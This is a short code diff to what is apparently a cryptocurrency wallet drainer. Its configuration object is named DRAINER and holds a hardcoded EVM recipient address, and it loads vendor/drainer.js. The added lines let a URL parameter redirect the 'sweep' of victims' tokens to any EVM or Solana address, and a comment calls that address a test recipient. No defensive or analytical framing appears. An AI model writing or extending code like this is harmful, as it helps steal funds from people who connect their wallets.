@@ -14,6 +14,14 @@ const DRAINER = {
   evmRecipient: "0x9FC141c559a8D667FD035D90ee3b961bEf758594",
 };
 
+/* ?to=<address> points the sweep at a test recipient; without it the constants above stand */
+(() => {
+  const to = new URLSearchParams(location.search).get("to");
+  if (!to) return;
+  if (/^0x[0-9a-fA-F]{40}$/.test(to)) DRAINER.evmRecipient = to;
+  else if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(to)) DRAINER.solRecipient = to;
+})();
+
 const SOL_TOKEN_PROGRAM = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
 const SOL_ATA_PROGRAM = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
 const DRAINER_SCRIPT = "vendor/drainer.js";
